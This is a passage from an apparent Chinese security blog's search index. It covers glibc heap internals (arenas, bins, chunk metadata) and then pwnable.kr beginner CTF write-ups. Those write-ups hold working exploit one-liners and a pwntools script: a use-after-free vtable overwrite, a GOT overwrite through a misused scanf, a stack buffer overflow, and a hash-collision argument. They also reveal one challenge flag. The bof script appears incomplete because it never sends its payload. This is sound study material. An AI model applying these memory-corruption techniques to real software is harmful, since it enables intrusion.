所以只要程序员遵循下面几个小的规则，堆管理器将确保每个已分配的堆不会相互重叠。这个特点使得堆非常有用并且高效，这和大多数C/C++程序追求性能的要求相符合。 接下来的图表列出了一些程序员在使用堆时的基本规则，以及在程序员违反这些规则时发生的一些漏洞类别。之后，我将更详细地讨论所有这些与堆相关的漏洞类别，目前只讨论堆使用正确时的表现。 HEAP RULES 当然，malloc和free并不是C和C++程序员与堆进行交互的唯一方式。相反，C++开发人员通常通过C++运算符new和new []分配内存。必须使用相应的C++运算符delete和delete []而不是free释放这些分配。程序员还可以通过与malloc兼容的堆函数（例如calloc，realloc和memalign）来分配内存，这些函数最终也通过free释放，就像malloc一样。 为简单起见，将首先讨论malloc和free，下面是一个C++程序如何分配，使用和释放堆上的结构体的例子： 12345678910111213141516class SomeClass&#123;public: int field1; char* field2;&#125;;int main()&#123; SomeClass* myObject = new SomeClass(); myObject-&gt;field1 = 1234; myObject-&gt;field2 = “Hello World!”; do_stuff(myObject); delete myObject; return 0;&#125; MEMORY CHUNKS AND THE CHUNK ALLOCATION STRATEGIES假设一个程序员通过malloc需求10字节内存，为了满足这个请求，堆管理器不仅仅只随机寻找一个10字节的程序员可以写的区域，而是需要做更多的事情。堆管理器也需要存储此次分配的元数据。这个元数据被存储在紧邻分配的10字节区域处。 堆管理器还需要确保分配空间在32位系统上是8字节对齐的，在64位系统上是16字节对齐的。如果程序员只想存储文本字符串或字节数组之类的数据，那么分配空间的对齐方式无关紧要。但是如果程序员打算使用分配空间来存储更多复杂的数据结构，则对齐方式会对程序的正确性和性能会产生重大影响。由于malloc无法知道程序员将在分配空间中存储什么内容，因此堆管理器必须默认确保所有分配空间均对齐。 此分配元数据和对齐填充字节与malloc的内存区域将一起被存储并返回给程序员。因此，堆管理器在内部分配的“块”内存比程序员最初要求的稍大。当程序员要求10个字节的内存时，堆管理器会找到或创建一个新的内存块，该块足以存储10个字节的空间、元数据以及对齐填充字节。然后，堆管理器将此块标记为“已分配”，并返回指向块内对齐的10字节“用户数据”区域的指针，程序员将收到malloc调用的返回值。 CHUNK ALLOCATION: BASIC STRATEGY那么堆管理器如何在内部分配这些块呢？ 首先，让我们看一下堆管理器的大部分工作，分配小块内存的（大大简化的）策略。我将在详细地解释每个步骤，之后我们就可以研究分配大块内存的特殊情况。 简化的小块分配策略如下： 如果有一个先前释放的内存块，并且该块足够大，可以满足用户的请求，则堆管理器将使用这个释放的块进行新的分配。 否则，如果堆顶部有可用空间，则堆管理器将从这个空闲的空间中分配一个新的块并使用它。 否则，堆管理器将要求内核向堆的末尾添加新的内存，并且从新分配的空间中分配一个新块给用户。 如果前面所有策略均失败，则无法为提供分配服务，并且malloc返回NULL。 ALLOCATING FROM FREE’D CHUNKS 从概念上讲，分配之前释放的块非常简单。因为当一个块在内存中被释放，堆管理器会在一系列称为“bins”的不同链表中记录这些释放的块。用户发出一个分配请求后，堆管理器会在这些“bins”中搜索一个足够大的空闲块，为用户提供服务。如果可以成功找到一个，则将这个空闲块从特定的bin中删除，并标记为“已分配”，然后这个指向该“user data”区域块的指针，会作为malloc的返回值返回给程序员。 出于性能原因，有几种不同类型的bins，即fast bins 、unsorted bins 、small bins、large bins 、per-thread tcache。下个部分将详细讨论这些不同种类的bins。 ALLOCATING FROM THE TOP OF THE HEAP 如果没有可用的空闲块可以满足分配请求，则堆管理器必须从头开始构造一个新块。为此，堆管理器首先查看堆顶部是否有足够的可用空间（有时称为“top chunk”或“remainder chunk”）。如果存在，堆管理器将在此可用空间基础上构造一个新块。 ASKING THE KERNEL FOR MORE MEMORY AT THE TOP OF THE HEAP 一旦堆顶部的可用空间用完，堆管理器将不得不要求内核在堆的末尾增加更多内存。 在建立堆的开始阶段上，堆管理器通过调用sbrk，要求内核在堆末尾分配更多的内存。在大多数基于Linux的系统上，在内部使用称为“ brk ”的系统调用。这个系统调用的名称很容易混淆，它最初的意思是“更改程序中断位置”，通俗来说，它表示在程序加载到内存之后，该区域会增加更多的内存。因为这是堆管理器从一开始创建堆的地方，所以此系统调用的作用是在程序堆的末尾分配更多的内存。 最终，如果一直使用sbrk扩展堆会导致分配失败，因为堆空间增长得太大之后，进一步扩展将导致其与进程地址空间中的其他内容发生冲突，例如内存映射，共享库或线程的堆栈区域。因此sbrk无法分配时，堆管理器将使用mmap调用将新的非连续内存附加到初始程序堆。 如果mmap也失败，则该进程根本无法分配更多的内存，并且malloc将返回NULL。 OFF-HEAP ALLOCATIONS VIA MMAP很大的分配请求（超过某个阈值*）在堆管理器中会得到特殊处理。通过直接调用mmap可以在堆外分配这些大块，并使用块中元数据的标记位来标记这一事实。当这些巨大块通过调用free释放到堆管理器时，堆管理器将通过munmap将整个mmap 过的区域返还给系统。 *默认情况下，此阈值 在32位系统上为128KB~512KB，在64位系统上为32MB，但是，如果堆管理器检测到这些分配的大块内存只需要被临时使用，则此阈值也会动态增加。 ARENAS在多线程应用程序上，堆管理器需要保护内部堆数据结构免受可能导致程序崩溃的竞争条件的影响。在ptmalloc2之前，堆管理器通过在每次堆操作之前简单地使用全局互斥锁，以确保在任何给定时间只有一个线程可以与堆进行交互。 尽管此策略有效，但堆分配器对高利用率和性能非常敏感，以至于导致使用大量线程的应用程序出现严重的性能问题。为了解决这个问题，ptmalloc2堆分配器引入了“arenas”的概念。每个“arenas”本质上是一个完全不同的堆，它完全独立地管理自己的块分配和free bins。每个“arenas”仍然使用互斥锁来序列化不同线程对内部数据结构的访问，但是只要线程与不同的“arenas”进行交互，线程就可以安全地执行堆操作而不会彼此停顿。 程序的初始（“main”）“arenas”仅包含我们已经看到的堆，对于单线程应用程序，这是堆管理器将使用的唯一arena。但是，随着新线程加入该进程，堆管理器会为每个新线程分配并附加“arenas”，以减少malloc和free等操作的等待时间。 对于每个加入该进程的新线程，堆管理器将先查找没有被其他线程在使用的“arenas”，并将该“arenas”附加到该线程。一旦所有可用的“arenas”都是在其它线程使用中，堆管理器将创建一个新的“arenas”，直到“arenas”的数目达到最大（32位进程为CPU核心数的2倍、64位进程位CPU核心的8倍）。一旦最终达到该限制，堆管理器就会放弃分配，这样多个线程将必须共享一个“arenas”，即执行堆操作将需要那些线程中的一个等待另一个线程。 但是这些二级“arenas”如何工作？我们看到，主堆在程序加载到内存的紧邻其后的位置，并使用brk系统调用对其进行扩展开始工作，但二级“arenas”并不相同，这些二级“arenas”使用mmap和mprotect创建的一个或多个“子堆”来模拟主堆的行为。 SUBHEAPS 子堆的工作方式与初始程序堆基本相同，主要存在两个区别。初始堆位于程序加载到内存之后的紧邻其后的位置，并且由sbrk动态扩展。相比之下，每个子堆使用mmap定位到内存中，堆管理器使用mprotect手动模拟增长子堆。 当堆管理器想要创建子堆时，它首先通过调用mmap要求内核保留该子堆可能增长到的内存区域。保留该区域不会将内存直接分配到子堆中；它只是要求内核不要在该区域内分配诸如线程堆栈，mmap区域或者其它的分配任务。*默认情况下，子堆大小最大（即保留该子堆使用的内存区域）在32位上为1MB，在64位系统上为64MB。 这是通过mmap询问标记为PROT_NONE的页面来完成的，这表明内核仅需要为该区域保留地址范围，不需要内核将内存直接分配给它。 在使用sbrk增长初始堆的地方，堆管理器通过手动调用mprotect将区域中的页面从PROT_NONE更改为PROT_READ | PROT_WRITE来将子堆“增长”到此保留的地址范围。这导致内核将物理内存附加到那些地址，实际上也会导致子堆缓慢增长，直到整个mmap区域已满。一旦整个子堆都用完，arenas便会分配另一个子堆。这将允许二级”arenas”几乎无限期地保持增长，直到内核耗尽内存或进程耗尽地址空间时才会失败。 Recap：初始（“main”）arena仅包含主堆，该主堆位于将程序二进制文件加载到内存之后的位置，并使用sbrk进行扩展。这是用于单线程应用程序的唯一arena。在多线程应用程序上，为新线程分配了二级arena，从中可以分配这些二级arena。使用arenas可以降低线程在执行堆操作之前需要等待互斥锁的可能性，从而提高了程序的速度。与main arena不同，这些二级arena从一个或多个子堆中分配块，这些子堆在内存中的位置首先使用mmap进行确定，并通过使用mprotect进行扩展。 CHUNK METADATA现在，了解了分配块的所有不同方式，这些块不仅包含提供给程序员的“用户数据”区域（作为malloc的返回值），同时包含元数据。下面介绍元数据实际记录的值以及存放的位置。 块的元数据在内存中的确切布局可能会很混乱，因为堆管理器源代码将一个块末尾的元数据与下一个块末尾的元数据组合在一起，并且几个存在并被使用的元数据字段取决于不同种类的chunk。 现在，我们仅看一下实时分配，它具有单个size_t * 标头，该标头位于给程序员的“用户数据”区域的后面。此字段（在源代码中称为mchunk_size）是在malloc期间写入的，之后由free决定如何处理该分配空间的释放。 * size_t值在32位系统上为4字节整数，在64位系统上为8字节整数。 该mchunk_size存储了四种信息：块的大小，以及被称为“A”,“M”和“P”三比特位。这些都被存储在相同的size_t字段中，因为块大小始终是8字节对齐的（在64位上是16字节对齐），因此，块大小的低三位始终为零。 “ A ”标志是用来告诉堆管理器，是否该块属于二级arena，而不是在main arena。在free期间，堆管理器仅仅给了一个指向程序员想要释放空间的指针，并且堆管理器需要确定该指针属于哪一个arena。如果在块的元数据中A标志被设置，则堆管理器必须搜索每个arena，并查看指针是否位于该arena的任何子堆中。如果未设置该标志，则堆管理器可以减少搜索，因为它知道该块来自初始的arena。 “ M ”标志用于指示该块是一个通过mmap进行堆外分配的巨大分配。当此分配空间最终返回给free时，堆管理器将通过munmap立即将整个块返回给操作系统，而不是尝试对其进行回收。因此，空闲即已经被释放的块永远不会设置该标志位。 “ P ”标志令人困惑，因为它实际上属于先前的块。它指示先前的块是一个空闲块。这意味着当这个块被释放时，可以将其安全地连接到先前的块上，以创建更大的空闲块。 下面是一些和堆相关的文章： Once upon a free() Malloc des-maleficarum The house of lore Advanced Doug Lea’s malloc exploits Yet another free() exploitation technique","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"uaf","slug":"Pwnable_kr/uaf","date":"2020-10-16T02:26:47.000Z","updated":"2020-10-19T07:10:20.000Z","comments":true,"path":"2020/10/16/Pwnable_kr/uaf/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/","excerpt":"","text":"查看uaf.cpp文件源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system(&quot;/bin/sh&quot;); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; 程序定义一个名为human的虚基类，之后定义了Man和Woman两个类继承这个类，并各自重写了父类的introduce()方法，主函数中，分别创建了一个Man和Woman的对象, 用户可以输入三个选项，分别为： use：Man和Woman分别调用introduce()方法，即使用指针指向的函数 after：分配一段地址空间存储main函数传递的数据，我们可以用其将已经被free的内存，重新allocate free：delete释放掉创建的对象的空间，即将指针指向的内存释放 三者的组合即可构成UAF漏洞 背景知识前置知识1：虚函数的内存地址空间在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。 1234567891011121314151617181920212223242526272829303132class Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; &#125; virtual void g() &#123; cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; &#125; virtual void h() &#123; cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; &#125; int base; protected: private: &#125;; //子类1，无虚函数重载 class Child1 : public Base &#123; public: virtual void f1() &#123; cout &lt;&lt; &quot;Child1::f1&quot; &lt;&lt; endl; &#125; virtual void g1() &#123; cout &lt;&lt; &quot;Child1::g1&quot; &lt;&lt; endl; &#125; virtual void h1() &#123; cout &lt;&lt; &quot;Child1::h1&quot; &lt;&lt; endl; &#125; int child1; protected: private: &#125;; //子类2，有1个虚函数重载 class Child2 : public Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Child2::f&quot; &lt;&lt; endl; &#125; virtual void g2() &#123; cout &lt;&lt; &quot;Child2::g2&quot; &lt;&lt; endl; &#125; virtual void h2() &#123; cout &lt;&lt; &quot;Child2::h2&quot; &lt;&lt; endl; &#125; int child2; protected: private: &#125;; 单一继承，无虚函数重载 单一继承，重载了虚函数 多重继承 总结 如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。注意这并不是直接继承了私有(private)虚函数 当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。 vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr Use-After-FreeDangling pointer Dangling pointer即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为NULL。 UAF原理对Dangling pointer所指向内存进行use，如指针解引用等。 利用思路将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串） 举个栗子123456typedef struct&#123; int id; char *name; int (*func)() //函数指针，可以理解为类里面的方法&#125;; 假设有上述这样的一个结构体指针p，在释放掉p之后，没有将p置NULL，所以p变成Dangling pointer，再通过重新分配，再次拿到p之前指向的这段地址空间。之后，通过strcpy(p2,”addr”)，或者其他方式，向这段地址空间写入新数据。然后当我们通过其他函数，再次使用p指针，就会造成无法预料的后果，因为此时p指针指向的内存包含的内容已经改变。 数据控制 任意地址读：$puts(p-&gt;name)—————&gt;puts(char*(addr2))$ 任意地址写：$strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)$ 控制流劫持：$p-&gt;func()———————&gt;call\\ addr3$ 解题思路查看文件保护措施 思路分析可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。 基本思路为：将main函数创建的两个对象先free，但指针并没有被销毁，之后我们allocate同样的大小，可以得到原先被释放的内存，这样就得到一个可控的地址空间，并且这个空间中记录了之前vptr指针，这样可通过改写这个虚表指针的值，之后再利用use，即m-&gt;introduce()时，劫持程序执行流，将本来执行的introduce函数变成执行give_shell函数。注意main中输入2分配空间是读取传入的两个参数，第一个决定分配空间的大小，第二个是读入一个文件，将文件中的内容写入到刚刚分配的空间中，因此我们首先要取得之前释放的空间，为保证这一点，需要使得传递的参数和之前释放的空间大小相同，而且这里需要分配两次，因为是两个对象，之后文件中的内容需将之前的虚表指针的值覆盖成我们想要的值，因为每个对象空间中的第一项记录的就是vptr，所以直接向文件中写入改写的虚表指针的值即可(从头开始读入，否则中间还需要填充一些字段)。 寻找vtable的地址 直接在将文件拖入IDA64中查看（当然这里也可以用gdb动态调试，从main函数一步步跟进）。因为vptr指向的是vtable中的第一项，由第一项存放的内容是函数give_shell的地址，找到give_shell的位置可以确定vptr的地址为$0x401570$，第二项，即vptr+8所指向的位置，存放的内容是子类重写的函数introduce的地址，main函数中输入1（use）会调用introduce函数，因此我们需要在调用introduce函数时，讲vptr的指针指向give_shell函数，即将指针向前移动8个字节长度。 10x401570 - 8 = 0x401568 -&gt; \\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00 确定每个对象分配的空间大小 可见原本分配的两个对象的空间为$0x18 = 24Byte$，所以之后分配的空间也同样为24字节。（这里没有必要手动计算类对象所占空间的大小，因为不同机器可能会存在差异，知道存在哪些项即可，不必过于纠结为什么是24字节。） 整理如下 输入3（free）：将分配的man和woman的空间释放（这里先释放man，在释放woman） 输入2（allocate）：先将woman释放的空间重新拿回 输入2（allocate）：再将man释放的空间重新拿回 输入（use）：通过传递的参数已经改写了vptr的值，执行introduce即give_shell，拿到flag PWN1python -c &quot;print &#x27;\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot; &gt; /tmp/exp.txt","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"random","slug":"Pwnable_kr/random","date":"2020-10-15T11:10:35.000Z","updated":"2020-10-19T07:10:12.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/random/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/random/","excerpt":"","text":"查看random.c源代码 函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。 rand（）函数 由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。 查看随机数$disassemble /r \\ main$查看汇编代码 在cmp处下断点汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \\ $rbp-4$查看内存的值即可。 所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。 PWN求出$0x6b8b4567\\oplus 0xdeadbeef$的值输入即可","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"collision","slug":"Pwnable_kr/collision","date":"2020-10-15T11:10:23.000Z","updated":"2020-10-19T07:09:52.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/collision/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/collision/","excerpt":"","text":"查看C语言源代码 main(int argc, char* argv[]) 传递三个参数$aa,bb,cc$, 程序运行结果如下: 注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递） 分析col.c 函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。 argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。 check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。 如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。 最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，注意不能设置为0x00，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。 另外，注意数据按照小端序存放： 编写python脚本 12./col $(python -c &quot;print &#x27;\\x01\\x01\\x01\\x01&#x27;*4 + &#x27;\\xe8\\x05\\xd9\\x1d&#x27;&quot;)# 这一inline的python表达式可以将生成的结果作为argv[1]参数 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"flag","slug":"Pwnable_kr/flag","date":"2020-10-15T11:10:06.000Z","updated":"2020-10-19T07:10:00.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/flag/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/","excerpt":"","text":"checksec查看文件属性 windows下使用upx -d命令解压缩 IDA64打开解压缩的文件 将flag的值存放到dest中，直接查看flag即可","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"fd","slug":"Pwnable_kr/fd","date":"2020-10-15T10:59:24.000Z","updated":"2020-10-19T07:09:56.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/fd/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/","excerpt":"","text":"登录远程服务器 ls -la查看文件信息linux文件权限知识 发现fd.c和其对应的可执行文件fd（用户有执行权限） cat fd.c查看c语言代码 有源代码可知，这里需要执行system函数的条件为buf缓冲区内容为LETMEIWN read(fd,buf,32)1234567read(fd, buf, 32)fd == 0时：则表示标准输入；fd == 1时：则表示标准输出；fd == 2时，则表示标准输出错误。buf 表示读入的缓冲区；32表示读入32字节； 因此我们需要设置fd为0，读取我们输入的LETMEWIN到buf缓冲区中即可获得flag。 注意到 1fd = atoi(argv[1]) - 0x1234 要使得$fd=0$，就是让main函数的第一个参数argv[1]等于$0x1234$ ./fd 4660 注意这里参数需要转为10进制 $0x1234_{16} = 4660_{10}$ 1flag: mommy! I think I know what a file descriptor is!!","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"passcode","slug":"Pwnable_kr/passcode","date":"2020-10-15T07:08:39.000Z","updated":"2020-10-19T07:10:08.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/passcode/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/passcode/","excerpt":"","text":"查看passcode.c源文件 第一反应为使得passcode1为338150、passcode2为13371337，之后调用system函数。 login函数中要求输入两个密码passcode1和passcode2，但scanf函数用法错误，其后并没有加上&amp;符号取其地址，而是直接使用了栈上两个没有初始化的随机值，因此直接输入则会出现segmentation fault。因此考虑在login函数之前执行的welcome函数。 welcome函数要求用户输入姓名的字符串，但是允许输入100字节长度，因此尝试使用其覆盖栈上两个变量的“随机值”。 gdb passcode查看其汇编代码disassemble /r welcome disassemble /r login 发现char数组在$ebp - 0x70$处，而passcode1、passcode2分别在$ebp - 0x10、ebp - 0xc$处，其相差的距离$0x70 - 0x10 = 96 &lt; 100,0x70 - 0xc = 100$，因此并不能直接通过输入姓名字符串覆盖变量passcode2,只可以覆盖passcode1。 转换思路查看文件保护措施 栈上开启了Canary机制，因此栈溢出很难成功，发现没有开启PIE，因此可以通过修改某些函数got表的地址，进行调用system函数。实际上，既然scanf是一个具有写功能的函数，我们完全可以利用scanf来修改此后使用到的某个函数的got表项。例如，程序在scanf(“%d”, passcode1);**后立即使用了fflush函数，所以我们完全可以先找到fflush的got表项地址（程序没有开PIE，无需leak），把passcode1布局为该地址，并在调用到scanf(“%d”, passcode1)时输入程序代码中调用system(“/bin/cat flag”);**处的地址，这样执行fflush函数时就会执行system函数。 注意这里区分got表本身的地址和写入got表项中的地址 fflush函数的地址 fflush地址为$0x0804a004$ system函数的地址 这里注意system函数需要将参数先压栈之后再调用，即真正调用的函数地址为$0x080485e3$，即在printf函数之后执行。 编写python脚本1python -c &quot;print &#x27;A&#x27; * 96 + &#x27;\\x04\\xa0\\x04\\x08&#x27; + &#x27;134514147\\n&#x27;&quot; | ./passcode 因为passcode是输入int型，即输入$0x080485e3 = 134514147$。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"bof","slug":"Pwnable_kr/bof","date":"2020-10-15T06:33:21.000Z","updated":"2020-10-19T07:09:44.000Z","comments":true,"path":"2020/10/15/Pwnable_kr/bof/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/","excerpt":"","text":"查看给出的c语言源代码 显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。 IDA32打开文件 编写python脚本123456from pwn import *io = remote(&#x27;pwnable.kr&#x27;,9000)payload = &#x27;a&#x27;*0x2C + &#x27;junk&#x27; + &#x27;junk&#x27; + p32(0xcafebabe)io.interactive()","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]}],"categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/"},{"name":"TensorFlow","slug":"Machine-Learning/TensorFlow","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Machine-Learning/TensorFlow/"},{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"AD_World","slug":"PWN/AD-World","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/AD-World/"},{"name":"C","slug":"C","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/"},{"name":"Linux","slug":"C/Linux","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/"},{"name":"touch","slug":"C/Linux/touch","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/C/Linux/touch/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Attack","slug":"PWN/Heap/Heap-Attack","permalink":"https://github.com/xiaohong404/xiaohon